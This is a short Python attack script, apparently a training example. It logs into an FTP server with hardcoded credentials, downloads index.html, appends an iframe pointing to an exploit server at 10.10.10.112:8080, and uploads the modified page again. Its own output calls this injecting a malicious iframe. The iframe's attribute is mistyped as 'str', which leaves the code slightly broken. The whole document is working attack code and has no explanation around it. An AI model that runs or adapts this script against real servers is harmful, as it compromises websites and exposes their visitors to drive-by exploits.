import os
import ftplib
def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Download Page: ' + page)
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)
    ftp.storlines('STOR ' + page , open(page + '.tmp', 'rb'))
    print('[+] Uploaded Injected Page: ' + page)
host = '192.168.28.174' #192.168.95.179'
userName = 'philip'
passWord = 'philip'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
print('\n[*] ' + str(host) +\
    ' FTP Logon Succeeded: '+userName+"/"+passWord)
redirect = '<iframe str='+\
    '"http://10.10.10.112:8080/exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)


